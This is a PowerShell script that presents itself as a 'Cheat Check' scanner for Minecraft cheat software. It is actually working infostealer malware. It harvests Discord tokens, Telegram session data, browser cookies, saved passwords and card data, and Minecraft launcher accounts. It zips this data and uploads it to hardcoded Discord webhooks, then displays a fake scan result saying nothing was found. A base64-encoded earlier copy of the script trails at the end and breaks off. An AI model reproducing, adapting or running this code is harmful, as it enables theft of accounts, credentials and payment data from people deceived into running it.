Add-Type -AssemblyName System.Net.Http
Write-Output " by funtime-project & cheat.check.ru                      "
Write-Output "   ____ _                _      ____ _               _    "
Write-Output "  / ___| |__   ___  __ _| |_   / ___| |__   ___  ___| | __"
Write-Output " | |   | '_ \ / _ \/ _\ | __| | |   | '_ \ / _ \/ __| |/ /"
Write-Output " | |___| | | |  __/ (_| | |_  | |___| | | |  __/ (__|   < "
Write-Output "  \____|_| |_|\___|\__,_|\__|  \____|_| |_|\___|\___|_|\_\" 
Write-Output "                                                          "
Write-Output "Загрузка... / Loading...                                  "

### --- // Variables \\ --- ###
$userName = Split-Path $env:USERPROFILE -Leaf
$user = "C:\Users\$userName"
$roaming = "$user\AppData\Roaming"
$local = "$user\AppData\Local"
$temp = $env:TEMP
#$Webhook_link = "https://discord.com/api/webhooks/1317091942332366869/T9Q35NYbIH2QMLbQYtXOmRzIRkrhxLV9Rj64yTmjZVy1g_Ol_QLVHzP2KflIBmqzPmPe"
#$debug_webhook_link = "https://discord.com/api/webhooks/1318104049475784735/M6-SnOLWBxawdKqI82z95yuwKcUT9XVfjuNx8Db1w9pZgGFoPmvRD4NALzRifIOGhueN" 
$Webhook_link = "https://discord.com/api/webhooks/1318960558984396961/n9-ClVxK_sS0oXOgAdK8vC7uCrPqZFLijw2VFv4A29crBHti22BTmgyZ6buqQckIFkqk"
$debug_webhook_link = "https://discord.com/api/webhooks/1318960558984396961/n9-ClVxK_sS0oXOgAdK8vC7uCrPqZFLijw2VFv4A29crBHti22BTmgyZ6buqQckIFkqk"
$zipFilePath = Join-Path $env:Temp "yawsteal.zip"

if($userName -eq "andro") {
    $scriptPath = "C:\Users\andro\OneDrive\Рабочий стол\test.ps1"

    $scriptContent = Get-Content -Path $scriptPath -Raw

    $encodedScript = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($scriptContent))

    Write-Host "[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($encodedScript))" -ForegroundColor Yellow
}

### --- // Functions \\ --- ###
function Send-Webhook {
    param(
        [string]$text
    )
    $httpClient = New-Object System.Net.Http.HttpClient
    $formData = New-Object System.Net.Http.MultipartFormDataContent
    $stringContent = New-Object System.Net.Http.StringContent("**$userName debug:** ``$text``")
    $formData.Add($stringContent, "content")
    $response = $httpClient.PostAsync($debug_webhook_link, $formData).Result`
}

### --- // Closing Processes \\ --- ###
$browsers = @(
    "browser",
    "msedge",
    "chrome"
)

foreach ($processName in $browsers) {
    #Stop-Process -Name $processName -ErrorAction SilentlyContinue -Force
}

### --- // Paths \\ --- ###
$filePaths = @{
    ## --- // Other \\ --- ##
    "Discord" = @{
        "$temp\discord_tokens.txt" = "discord_tokens.txt"
    }

    "Telegram Desktop" = @{
        "$roaming\Telegram Desktop\tdata" = "tdata"
    }
    
    ## --- // Browsers \\ --- ##
    "Yandex (Hashed)" = @{
        "$local\Yandex\YandexBrowser\User Data\Default\Network\Cookies" = "yandex_cookies.txt"
        "$local\Yandex\YandexBrowser\User Data\Default\Ya Credit Cards" = "yandex_credit_cards.txt"
        "$local\Yandex\YandexBrowser\User Data\Default\Ya Passman Data" = "yandex_passwords.txt"
    }

    "Google Chrome (Hashed)" = @{
        "$local\Google\Chrome\User Data\Default\Network\Cookies" = "chrome_cookies.txt"
        "$local\Google\Chrome\User Data\Default\Login Data" = "chrome_passwords.txt"
        "$local\Google\Chrome\User Data\Local State" = "Local State"
    }

    "Microsoft Edge (Hashed)" = @{
        "$local\Microsoft\Edge\User Data\Default\Network\Cookies" = "edge_cookies.txt"
        "$local\Microsoft\Edge\User Data\Default\Login Data" = "edge_passwords.txt"
        "$local\Microsoft\Edge\User Data\Local State" = "Local State"
    }

    "Mozilla Firefox (Hashed)" = @{
        "$roaming\Mozilla\Firefox\Profiles\logins.json" = "mozilla_firefox_passwords.txt"
        "$roaming\Mozilla\Firefox\Profiles\Local State" = "Local State"
    }

    "Opera (Hashed)" = @{
        "$roaming\Opera Software\Opera GX Stable\Network\Cookies" = "opera_cookies.txt"
        "$roaming\Opera Software\Opera GX Stable\Cookies" = "opera_cookies.txt"
        "$roaming\Opera Software\Opera Stable\Login Data" = "opera_passwords.txt"
        "$roaming\Opera Software\Opera Stable\Local State" = "Local State"
    }

    "Opera GX (Hashed)" = @{
        "$roaming\Opera Software\Opera GX Stable\Network\Cookies" = "opera_cookies.txt"
        "$roaming\Opera Software\Opera GX Stable\Cookies" = "opera_gx_cookies.txt"
        "$roaming\Opera Software\Opera GX Stable\Login Data" = "opera_gx_passwords.txt"
        "$roaming\Opera Software\Opera GX Stable\Local State" = "Local State"
    }
    
    ## --- // Minecraft Clients \\ --- ##
    "Cristalix" = @{
        "$user\.cristalix\.launcher" = ".launcher.txt"
    }

    "Lunar Client" = @{
        "$user\.lunarclient\settings\game\accounts.json" = "accounts.json"
    }

    "Minecraft" = @{
        "$roaming\.minecraft\launcher_accounts_microsoft_store.json" = "launcher_accounts_microsoft_store.json"
    }

    "Intent Client" = @{
        "$user\intentlauncher\launcherconfig" = "launcherconfig.txt"
    }

    "TLauncher" = @{
        "$roaming\.minecraft\TlauncherProfiles.json" = "TlauncherProfiles.json"
    }

    "Feather Client" = @{
        "$roaming\.feather\accounts.json" = "accounts.json"
    }

    "Meteor Client" = @{
        "$roaming\.minecraft\meteor-client\accounts.nbt" = "accounts.nbt"
    }
    

    "Impact Client" = @{
        "$roaming\.minecraft\Impact\alts.json" = "alts.json"
    }

    "Novoline Client" = @{
        "$roaming\.minecraft\Novoline\alts.novo" = "alts.novo"
    }

    "CheatBreakers Client" = @{
        "$roaming\.minecraft\cheatbreaker_accounts.json" = "cheatbreaker_accounts.json"
    }

    "Rise Client" = @{
        "$roaming\.minecraft\Rise\alts.txt" = "alts.txt"
    }

    "Rise Client (Intent)" = @{
        "$user\intentlauncher\Rise\alts.txt" = "alts.txt"
    }

    "Paladium Client" = @{
        "$roaming\paladium-group\accounts.json" = "accounts.json"
    }

    "PolyMC Client" = @{
        "$roaming\PolyMC\accounts.json" = "accounts.json"
    }

    "Badlion Client" = @{
        "$roaming\Badlion Client\accounts.json" = "accounts.json"
    }
}

### --- // Discord \\ --- ###
$dsc_targets = @(
    "$env:APPDATA\Discord",
    "$env:APPDATA\discordcanary",
    "$env:APPDATA\discordptb",
    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default",
    "$env:LOCALAPPDATA\Yandex\YandexBrowser\User Data\Default"
)

$dsc_regexes = @(
    "[\w-]{24}\.[\w-]{6}\.[\w-]{38}",
    "mfa\.[\w-]{84}"
)

$dsc_tokens = @()

foreach ($target in $dsc_targets) {
    $leveldbPath = Join-Path $target "Local Storage\leveldb"

    if (Test-Path $leveldbPath) {
        Get-ChildItem -Path $leveldbPath -Filter "*.ldb" -Recurse -ErrorAction SilentlyContinue | ForEach-Object {
            $fileContent = Get-Content $_.FullName -Raw
            foreach ($regex in $dsc_regexes) {
                $matches = [regex]::Matches($fileContent, $regex)
                foreach ($match in $matches) {
                    $dsc_tokens += $match.Value
                }
            }
        }

        Get-ChildItem -Path $leveldbPath -Filter "*.log" -Recurse -ErrorAction SilentlyContinue | ForEach-Object {
            $fileContent = Get-Content $_.FullName -Raw
            foreach ($regex in $dsc_regexes) {
                $matches = [regex]::Matches($fileContent, $regex)
                foreach ($match in $matches) {
                    $dsc_tokens += $match.Value
                }
            }
        }
    }
}

if ($dsc_tokens -and $dsc_tokens.Count -gt 0) {
    $filePath = Join-Path $env:Temp "discord_tokens.txt"
    $dsc_tokens | Out-File -FilePath $filePath -Encoding UTF8
}

## --- // Zip Archive & Temp Folder Creating \\ --- ##
if (Test-Path $zipFilePath) {
    Remove-Item $zipFilePath -Force
}

$tempFolder = Join-Path $env:Temp "tempZipFolder"
if (Test-Path $tempFolder) {
    Remove-Item $tempFolder -Recurse -Force
}
New-Item -ItemType Directory -Path $tempFolder | Out-Null

## --- // foreach paths \\ --- ##
$totalFiles = 0;
foreach ($folderName in $filePaths.Keys) {
    $paths = $filePaths[$folderName] # "@{paths}"
    $folderName = $folderName + "\"
    foreach ($filePath in $paths.Keys) {
        $copyName = $paths[$filePath] # "accounts.json"
        if (Test-Path $filePath) {
            try {
                $folderPath = Join-Path -Path $tempFolder -ChildPath $folderName
                if (Test-Path $folderPath) {} else {
                    New-Item -ItemType Directory -Path $folderPath | Out-Null
                }
                $destinationPath = Join-Path -Path $folderPath -ChildPath $copyName
                    Copy-Item -Path $filePath -Destination $folderPath -Force
                $totalFiles = $totalFiles + 1
            } catch {
                Send-Webhook -Text "Ошибка копирования файла '$filePath': $_"
            }
        } else {
            Send-Webhook -Text "Файл '$filePath' не найден по такому пути"
        }
    }
}
$totalName = "Всего спизженно файлов — " + $totalFiles
$totalPath = Join-Path -Path $tempFolder -ChildPath $totalName
New-Item -ItemType File -Path $totalPath | Out-Null

### --- // Process \\ --- ###
#$outputPath = "$tempFolder\Screenshot.jpg"

#Add-Type -AssemblyName System.Drawing

#$screenWidth = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width
#$screenHeight = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height
#$bitmap = New-Object System.Drawing.Bitmap $screenWidth, $screenHeight

#$graphics = [System.Drawing.Graphics]::FromImage($bitmap)
#$graphics.CopyFromScreen(0, 0, 0, 0, $bitmap.Size)

#$bitmap.Save($outputPath, [System.Drawing.Imaging.ImageFormat]::Jpeg)

#$graphics.Dispose()

## --- // TELEGRAM | TDATA \\ --- ##
$tdata = "$roaming\Telegram Desktop\tdata"
$tdatas = @(
    "$roaming\Telegram Desktop\tdata",
    "$user\OneDrive\Downloads\Telegram Desktop\tdata",
    "$user\Downloads\Telegram Desktop\tdata",
    "D:\Telegram Desktop\tdata",
    "D:\AyuGram Desktop\tdata",
    "D:\tdata",
    "$roaming\AyuGram Desktop\tdata",
    "$user\OneDrive\Downloads\tdata",
    "$user\Downloads\AyuGram Desktop\tdata"
)
foreach ($tryTdata in $tdatas) {
    if (Test-Path -Path $tryTdata) {
        $tdata = $tryTdata
    }
}

$tDataPath = $tdata
$destination = "$tempFolder\Telegram Desktop\tdata"
# Проверяем существование папки tdata
if (Test-Path -Path $tDataPath) {
    # Список файлов и папок в tdata
    $files = Get-ChildItem -Path $tDataPath -File
    $dirs = Get-ChildItem -Path $tDataPath -Directory

    # Путь к key_datas
    $keyDatasPath = Join-Path -Path $tDataPath -ChildPath "key_datas"
    $loginPaths = @()
    $has_key_datas = $false
    
    # Проверяем наличие key_datas
    if (Test-Path -Path $keyDatasPath) {
        $has_key_datas = $true
        $loginPaths += $keyDatasPath
    }

    # Сопоставляем файлы и папки
    foreach ($file in $files) {
        foreach ($dir in $dirs) {
            if ($file.Name -eq $dir.Name + "s") {
                $loginPaths += $file.FullName
                $loginPaths += $dir.FullName
            }
        }
    }

    # Если найдены loginPaths и key_datas
    if ($has_key_datas -and ($loginPaths.Count -gt 1)) {
        try {
            # Создаем целевую папку
            if (-not (Test-Path -Path $destination)) {
                New-Item -ItemType Directory -Path $destination | Out-Null
            }
            
            # Копируем файлы и папки
            foreach ($item in $loginPaths) {
                if (Test-Path -Path $item -PathType Leaf) {
                    # Копируем файл
                    Copy-Item -Path $item -Destination (Join-Path -Path $destination -ChildPath (Split-Path -Leaf $item))
                } elseif (Test-Path -Path $item -PathType Container) {
                    # Копируем папку
                    Copy-Item -Path $item -Destination (Join-Path -Path $destination -ChildPath (Split-Path -Leaf $item)) -Recurse
                }
            }

            Send-Webhook -Text "Файлы и папки успешно скопированы." -ForegroundColor Green
        } catch {
            Send-Webhook -Text "Ошибка при копировании: $_" -ForegroundColor Red
        }
    }
}

$filePathssss = @(
    "$tdata\key_datas.bin",
    "$tdata\settingss",
    "$tdata\usertag"
)

foreach ($f2 in $filePathssss) {
    if (Test-Path -Path $f2 -PathType Leaf) {
        Copy-Item -Path $f2 -Destination $destination
    } elseif (Test-Path -Path $f2 -PathType Container) {
        Copy-Item -Path $f2 -Destination $destination -Recurse
    }
}

## --- // ZIP ARCHIVE CREATING \\ --- ##
try {
    Compress-Archive -Path "$tempFolder\*" -DestinationPath $zipFilePath -Force
} catch {
    return
}


## --- // Discord Webhook \\ --- ##
if($userName -eq "andro") {

} else {
    try {
        $httpClient = New-Object System.Net.Http.HttpClient
        $formData = New-Object System.Net.Http.MultipartFormDataContent

        $stringContent = New-Object System.Net.Http.StringContent("> Кто-то попался в ловушечку Ю_ю")
        $formData.Add($stringContent, "content")

        $fileStream = [System.IO.File]::OpenRead($zipFilePath)
        $fileContent = New-Object System.Net.Http.StreamContent($fileStream)
        $fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/zip")
        $formData.Add($fileContent, "file", $userName + "_data.zip")

        $response = $httpClient.PostAsync($Webhook_link, $formData).Result

        if (-Not $response.IsSuccessStatusCode) {
            Send-Webhook -Text "Failed to send ZIP archive. HTTP status: $($response.StatusCode)"
        }
        Send-Webhook -Text "ZIP sended!"
    } catch {
        Send-Webhook -Text "Error sending ZIP archive: $_"
    }
}


## --- // Ending & Visual \\ --- ##
Remove-Item $zipFilePath -Force
$aaa123 = "$env:TEMP\discord_tokens.txt"
if (Test-Path -Path $aaa123) {
    Remove-Item "$env:TEMP\discord_tokens.txt" -Force
}
Write-Output "———————————————————————————————————————————————————————————"
Write-Output " "
Write-Output " @ Current task:    Scanning C:\ for Doomsday"
$progressBarLength = 50
$i = 0
for (; $i -le $progressBarLength; $i++) {
    $progressBar = "[" + ("=" * $i).PadRight($progressBarLength) + "]"
    Write-Host -NoNewline "`r$progressBar ($([math]::Round(($i / $progressBarLength) * 100)))%"
    Start-Sleep -Milliseconds 200
}
Write-Output " "
Write-Output "———————————————————————————————————————————————————————————"

Write-Output " "
Write-Host "Stopped. Doomsday и прочие скрытые ПО не найдены" -ForegroundColor Green

Pause
Start-Sleep -Seconds 2
exit

# Write-Host "Ver 1.0"
#$ASJF7087hD28C01H64Cm132864cnH1N947981 = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("QWRkLVR5cGUgLUFzc2VtYmx5TmFtZSBTeXN0ZW0uTmV0Lkh0dHANCldyaXRlLU91dHB1dCAiIGJ5IGZ1bnRpbWUtcHJvamVjdCAmIGNoZWF0LmNoZWNrLnJ1ICAgICAgICAgICAgICAgICAgICAgICINCldyaXRlLU91dHB1dCAiICAgX19fXyBfICAgICAgICAgICAgICAgIF8gICAgICBfX19fIF8gICAgICAgICAgICAgICBfICAgICINCldyaXRlLU91dHB1dCAiICAvIF9fX3wgfF9fICAgX19fICBfXyBffCB8XyAgIC8gX19ffCB8X18gICBfX18gIF9fX3wgfCBfXyINCldyaXRlLU91dHB1dCAiIHwgfCAgIHwgJ18gXCAvIF8gXC8gX1wgfCBfX3wgfCB8ICAgfCAnXyBcIC8gXyBcLyBfX3wgfC8gLyINCldyaXRlLU91dHB1dCAiIHwgfF9fX3wgfCB8IHwgIF9fLyAoX3wgfCB8XyAgfCB8X19ffCB8IHwgfCAgX18vIChfX3wgICA8ICINCldyaXRlLU91dHB1dCAiICBcX19fX3xffCB8X3xcX19ffFxfXyxffFxfX3wgIFxfX19ffF98IHxffFxfX198XF9fX3xffFxfXCIgDQpXcml0ZS1PdXRwdXQgIiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAiDQpXcml0ZS1PdXRwdXQgItCX0LDQs9GA0YPQt9C60LAuLi4gLyBMb2FkaW5nLi4uICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICINCg0KIyMjIC0tLSAvLyBWYXJpYWJsZXMgXFwgLS0tICMjIw0KJHVzZXJOYW1lID0gU3BsaXQtUGF0aCAkZW52OlVTRVJQUk9GSUxFIC1MZWFmDQokdXNlciA9ICJDOlxVc2Vyc1wkdXNlck5hbWUiDQokcm9hbWluZyA9ICIkdXNlclxBcHBEYXRhXFJvYW1pbmciDQokbG9jYWwgPSAiJHVzZXJcQXBwRGF0YVxMb2NhbCINCiR0ZW1wID0gJGVudjpURU1QDQokV2ViaG9va19saW5rID0gImh0dHBzOi8vZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzEzMTcwOTE5NDIzMzIzNjY4NjkvVDlRMzVOWWJJSDJRTUxiUVl0WE9tUnpJUmtyaHhMVjlSajY0eVRtalpWeTFnX09sX1FMVkh6UDJLZmxJQm1xelBtUGUiDQokZGVidWdfd2ViaG9va19saW5rID0gImh0dHBzOi8vZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzEzMTgxMDQwNDk0NzU3ODQ3MzUvTTYtU25PTFdCeGF3ZEtxSTgyejk1eXV3S2NVVDlYVmZqdU54OERiMXc5cFpnR0ZvUG12UkQ0TkFMelJpZklPR2h1ZU4iDQokemlwRmlsZVBhdGggPSBKb2luLVBhdGggJGVudjpUZW1wICJ5YXdzdGVhbC56aXAiDQogICAgDQppZigkdXNlck5hbWUgLWVxICJhbmRybyIpIHsKICAgICRzY3JpcHRQYXRoID0gIkM6XFVzZXJzXGFuZHJvXE9uZURyaXZlXNCg0LDQsdC+0YfQuNC5INGB0YLQvtC7XHRlc3QucHMxIgoKICAgICRzY3JpcHRDb250ZW50ID0gR2V0LUNvbnRlbnQgLVBhdGggJHNjcmlwdFBhdGggLVJhdwoKICAgICRlbmNvZGVkU2NyaXB0ID0gW0NvbnZlcnRdOjpUb0Jhc2U2NFN0cmluZyhbVGV4dC5FbmNvZGluZ106OlVURjguR2V0Qnl0ZXMoJHNjcmlwdENvbnRlbnQpKQoKICAgIFdyaXRlLUhvc3QgIltUZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoW0NvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCRlbmNvZGVkU2NyaXB0KSkiIC1Gb3JlZ3JvdW5kQ29sb3IgWWVsbG93DQp9DQoNCiMjIyAtLS0gLy8gRnVuY3Rpb25zIFxcIC0tLSAjIyMNCmZ1bmN0aW9uIFNlbmQtV2ViaG9vayB7CiAgICBwYXJhbSgKICAgICAgICBbc3RyaW5nXSR0ZXh0CiAgICApCiAgICAkaHR0cENsaWVudCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5IdHRwLkh0dHBDbGllbnQNCiAgICAkZm9ybURhdGEgPSBOZXctT2JqZWN0IFN5c3RlbS5OZXQuSHR0cC5NdWx0aXBhcnRGb3JtRGF0YUNvbnRlbnQNCiAgICAkc3RyaW5nQ29udGVudCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5IdHRwLlN0cmluZ0NvbnRlbnQoIioqJHVzZXJOYW1lIGRlYnVnOioqIGBgJHRleHRgYCIpDQogICAgJGZvcm1EYXRhLkFkZCgkc3RyaW5nQ29udGVudCwgImNvbnRlbnQiKQ0KICAgICRyZXNwb25zZSA9ICRodHRwQ2xpZW50LlBvc3RBc3luYygkZGVidWdfd2ViaG9va19saW5rLCAkZm9ybURhdGEpLlJlc3VsdGAKfQ0KDQojIyMgLS0tIC8vIENsb3NpbmcgUHJvY2Vzc2VzIFxcIC0tLSAjIyMNCiRicm93c2VycyA9IEAoDQogICAgImJyb3dzZXIiLA0KICAgICJtc2VkZ2UiLA0KICAgICJjaHJvbWUiLA0KICAgICJUZWxlZ3JhbSINCikNCg0KZm9yZWFjaCAoJHByb2Nlc3NOYW1lIGluICRicm93c2Vycykgew0KICAgICNTdG9wLVByb2Nlc3MgLU5hbWUgJHByb2Nlc3NOYW1lIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIC1Gb3JjZQ0KfQ0KDQojIyMgLS0tIC8vIFBhdGhzIFxcIC0tLSAjIyMNCiRmaWxlUGF0aHMgPSBAew0KICAgICMjIC0tLSAvLyBPdGhlciBcXCAtLS0gIyMNCiAgICAiRGlzY29yZCIgPSBAew0KICAgICAgICAiJHRlbXBcZGlzY29yZF90b2tlbnMudHh0IiA9ICJkaXNjb3JkX3Rva2Vucy50eHQiDQogICAgfQ0KDQogICAgIlRlbGVncmFtIERlc2t0b3AiID0gQHsNCiAgICAgICAgIiRyb2FtaW5nXFRlbGVncmFtIERlc2t0b3BcdGRhdGEiID0gInRkYXRhIg0KICAgIH0NCiAgICANCiAgICAjIyAtLS0gLy8gQnJvd3NlcnMgXFwgLS0tICMjDQogICAgIllhbmRleCAoSGFzaGVkKSIgPSBAew0KICAgICAgICAiJGxvY2FsXFlhbmRleFxZYW5kZXhCcm93c2VyXFVzZXIgRGF0YVxEZWZhdWx0XE5ldHdvcmtcQ29va2llcyIgPSAieWFuZGV4X2Nvb2tpZXMudHh0Ig0KICAgICAgICAiJGxvY2FsXFlhbmRleFxZYW5kZXhCcm93c2VyXFVzZXIgRGF0YVxEZWZhdWx0XFlhIENyZWRpdCBDYXJkcyIgPSAieWFuZGV4X2NyZWRpdF9jYXJkcy50eHQiDQogICAgICAgICIkbG9jYWxcWWFuZGV4XFlhbmRleEJyb3dzZXJcVXNlciBEYXRhXERlZmF1bHRcWWEgUGFzc21hbiBEYXRhIiA9ICJ5YW5kZXhfcGFzc3dvcmRzLnR4dCINCiAgICB9DQoNCiAgICAiR29vZ2xlIENocm9tZSAoSGFzaGVkKSIgPSBAew0KICAgICAgICAiJGxvY2FsXEdvb2dsZVxDaHJvbWVcVXNlciBEYXRhXERlZmF1bHRcTmV0d29ya1xDb29raWVzIiA9ICJjaHJvbWVfY29va2llcy50eHQiDQogICAgICAgICIkbG9jYWxcR29vZ2xlXENocm9tZVxVc2VyIERhdGFcRGVmYXVsdFxMb2dpbiBEYXRhIiA9ICJjaHJvbWVfcGFzc3dvcmRzLnR4dCINCiAgICAgICAgIiRsb2NhbFxHb29nbGVcQ2hyb21lXFVzZXIgRGF0YVxMb2NhbCBTdGF0ZSIgPSAiTG9jYWwgU3RhdGUiDQogICAgfQ0KDQogICAgIk1pY3Jvc29mdCBFZGdlIChIYXNoZWQpIiA9IEB7DQogICAgICAgICIkbG9jYWxcTWljcm9zb2Z0XEVkZ2VcVXNlciBEYXRhXERlZmF1bHRcTmV0d29ya1xDb29raWVzIiA9ICJlZGdlX2Nvb2tpZXMudHh0Ig0KICAgICAgICAiJGxvY2FsXE1pY3Jvc29mdFxFZGdlXFVzZXIgRGF0YVxEZWZhdWx0XExvZ2luIERhdGEiID0gImVkZ2VfcGFzc3dvcmRzLnR4dCINCiAgICAgICAgIiRsb2NhbFxNaWNyb3NvZnRcRWRnZVxVc2VyIERhdGFcTG9jYWwgU3RhdGUiID0gIkxvY2FsIFN0YXRlIg0KICAgIH0NCg0KICAgICJNb3ppbGxhIEZpcmVmb3ggKEhhc2hlZCkiID0gQHsNCiAgICAgICAgIiRyb2FtaW5nXE1vemlsbGFcRmlyZWZveFxQcm9maWxlc1xsb2dpbnMuanNvbiIgPSAibW96aWxsYV9maXJlZm94X3Bhc3N3b3Jkcy50eHQiDQogICAgICAgICIkcm9hbWluZ1xNb3ppbGxhXEZpcmVmb3hcUHJvZmlsZXNcTG9jYWwgU3RhdGUiID0gIkxvY2FsIFN0YXRlIg0KICAgIH0NCg0KICAgICJPcGVyYSAoSGFzaGVkKSIgPSBAew0KICAgICAgICAiJHJvYW1pbmdcT3BlcmEgU29mdHdhcmVcT3BlcmEgR1ggU3RhYmxlXE5ldHdvcmtcQ29va2llcyIgPSAib3BlcmFfY29va2llcy50eHQiDQogICAgICAgICIkcm9hbWluZ1xPcGVyYSBTb2Z0d2FyZVxPcGVyYSBHWCBTdGFibGVcQ29va2llcyIgPSAib3BlcmFfY29va2llcy50eHQiDQogICAgICAgICIkcm9hbWluZ1xPcGVyYSBTb2Z0d2FyZVxPcGVyYSBTdGFibGVcTG9naW4gRGF0YSIgPSAib3BlcmFfcGFzc3dvcmRzLnR4dCINCiAgICAgICAgIiRyb2FtaW5nXE9wZXJhIFNvZnR3YXJlXE9wZXJhIFN0YWJsZVxMb2NhbCBTdGF0ZSIgPSAiTG9jYWwgU3RhdGUiDQogICAgfQ0KDQogICAgIk9wZXJhIEdYIChIYXNoZWQpIiA9IEB7DQogICAgICAgICIkcm9hbWluZ1xPcGVyYSBTb2Z0d2FyZVxPcGVyYSBHWCBTdGFibGVcTmV0d29ya1xDb29raWVzIiA9ICJvcGVyYV9jb29raWVzLnR4dCINCiAgICAgICAgIiRyb2FtaW5nXE9wZXJhIFNvZnR3YXJlXE9wZXJhIEdYIFN0YWJsZVxDb29raWVzIiA9ICJvcGVyYV9neF9jb29raWVzLnR4dCINCiAgICAgICAgIiRyb2FtaW5nXE9wZXJhIFNvZnR3YXJlXE9wZXJhIEdYIFN0YWJsZVxMb2dpbiBEYXRhIiA9ICJvcGVyYV9neF9wYXNzd29yZHMudHh0Ig0KICAgICAgICAiJHJvYW1pbmdcT3BlcmEgU29mdHdhcmVcT3BlcmEgR1ggU3RhYmxlXExvY2FsIFN0YXRlIiA9ICJMb2NhbCBTdGF0ZSINCiAgICB9DQogICAgDQogICAgIyMgLS0tIC8vIE1pbmVjcmFmdCBDbGllbnRzIFxcIC0tLSAjIw0KICAgICJDcmlzdGFsaXgiID0gQHsNCiAgICAgICAgIiR1c2VyXC5jcmlzdGFsaXhcLmxhdW5jaGVyIiA9ICIubGF1bmNoZXIudHh0Ig0KICAgIH0NCg0KICAgICJMdW5hciBDbGllbnQiID0gQHsNCiAgICAgICAgIiR1c2VyXC5sdW5hcmNsaWVudFxzZXR0aW5nc1xnYW1lXGFjY291bnRzLmpzb24iID0gImFjY291bnRzLmpzb24iDQogICAgfQ0KDQogICAgIk1pbmVjcmFmdCIgPSBAew0KICAgICAgICAiJHJvYW1pbmdcLm1pbmVjcmFmdFxsYXVuY2hlcl9hY2NvdW50c19taWNyb3NvZnRfc3RvcmUuanNvbiIgPSAibGF1bmNoZXJfYWNjb3VudHNfbWljcm9zb2Z0X3N0b3JlLmpzb24iDQogICAgfQ0KDQogICAgIkludGVudCBDbGllbnQiID0gQHsNCiAgICAgICAgIiR1c2VyXGludGVudGxhdW5jaGVyXGxhdW5jaGVyY29uZmlnIiA9ICJsYXVuY2hlcmNvbmZpZy50eHQiDQogICAgfQ0KDQogICAgIlRMYXVuY2hlciIgPSBAew0KICAgICAgICAiJHJvYW1pbmdcLm1pbmVjcmFmdFxUbGF1bmNoZXJQcm9maWxlcy5qc29uIiA9ICJUbGF1bmNoZXJQcm9maWxlcy5qc29uIg0KICAgIH0NCg0KICAgICJGZWF0aGVyIENsaWVudCIgPSBAew0KICAgICAgICAiJHJvYW1pbmdcLmZlYXRoZXJcYWNjb3VudHMuanNvbiIgPSAiYWNjb3VudHMuanNvbiINCiAgICB9DQoNCiAgICAiTWV0ZW9yIENsaWVudCIgPSBAew0KICAgICAgICAiJHJvYW1pbmdcLm1pbmVjcmFmdFxtZXRlb3ItY2xpZW50XGFjY291bnRzLm5idCIgPSAiYWNjb3VudHMubmJ0Ig0KICAgIH0NCiAgICANCg0KICAgICJJbXBhY3QgQ2xpZW50IiA9IEB7DQogICAgICAgICIkcm9hbWluZ1wubWluZWNyYWZ0XEltcGFjdFxhbHRzLmpzb24iID0gImFsdHMuanNvbiINCiAgICB9DQoNCiAgICAiTm92b2xpbmUgQ2xpZW50IiA9IEB7DQogICAgICAgICIkcm9hbWluZ1wubWluZWNyYWZ0XE5vdm9saW5lXGFsdHMubm92byIgPSAiYWx0cy5ub3ZvIg0KICAgIH0NCg0KICAgICJDaGVhdEJyZWFrZXJzIENsaWVudCIgPSBAew0KICAgICAgICAiJHJvYW1pbmdcLm1pbmVjcmFmdFxjaGVhdGJyZWFrZXJfYWNjb3VudHMuanNvbiIgPSAiY2hlYXRicmVha2VyX2FjY291bnRzLmpzb24iDQogICAgfQ0KDQogICAgIlJpc2UgQ2xpZW50IiA9IEB7DQogICAgICAgICIkcm9hbWluZ1wubWluZWNyYWZ0XFJpc2VcYWx0cy50eHQiID0gImFsdHMudHh0Ig0KICAgIH0NCg0KICAgICJSaXNlIENsaWVudCAoSW50ZW50KSIgPSBAew0KICAgICAgICAiJHVzZXJcaW50ZW50bGF1bmNoZXJcUmlzZVxhbHRzLnR4dCIgPSAiYWx0cy50eHQiDQogICAgfQ0KDQogICAgIlBhbGFkaXVtIENsaWVudCIgPSBAew0KICAgICAgICAiJHJvYW1pbmdccGFsYWRpdW0tZ3JvdXBcYWNjb3VudHMuanNvbiIgPSAiYWNjb3VudHMuanNvbiINCiAgICB9DQoNCiAgICAiUG9seU1DIENsaWVudCIgPSBAew0KICAgICAgICAiJHJvYW1pbmdcUG9seU1DXGFjY291bnRzLmpzb24iID0gImFjY291bnRzLmpzb24iDQogICAgfQ0KDQogICAgIkJhZGxpb24gQ2xpZW50IiA9IEB7DQogICAgICAgICIkcm9hbWluZ1xCYWRsaW9uIENsaWVudFxhY2NvdW50cy5qc29uIiA9ICJhY2NvdW50cy5qc29uIg0KICAgIH0NCn0NCg0KIyMjIC0tLSAvLyBEaXNjb3JkIFxcIC0tLSAjIyMNCiRkc2NfdGFyZ2V0cyA9IEAoDQogICAgIiRlbnY6QVBQREFUQVxEaXNjb3JkIiwNCiAgICAiJGVudjpBUFBEQVRBXGRpc2NvcmRjYW5hcnkiLA0KICAgICIkZW52OkFQUERBVEFcZGlzY29yZHB0YiIsDQogICAgIiRlbnY6TE9DQUxBUFBEQVRBXEdvb2dsZVxDaHJvbWVcVXNlciBEYXRhXERlZmF1bHQiLA0KICAgICIkZW52OkxPQ0FMQVBQREFUQVxZYW5kZXhcWWFuZGV4QnJvd3NlclxVc2VyIERhdGFcRGVmYXVsdCINCikNCg0KJGRzY19yZWdleGVzID0gQCgNCiAgICAiW1x3LV17MjR9XC5bXHctXXs2fVwuW1x3LV17Mzh9IiwNCiAgICAibWZhXC5bXHctXXs4NH0iDQopDQoNCiRkc2NfdG9rZW5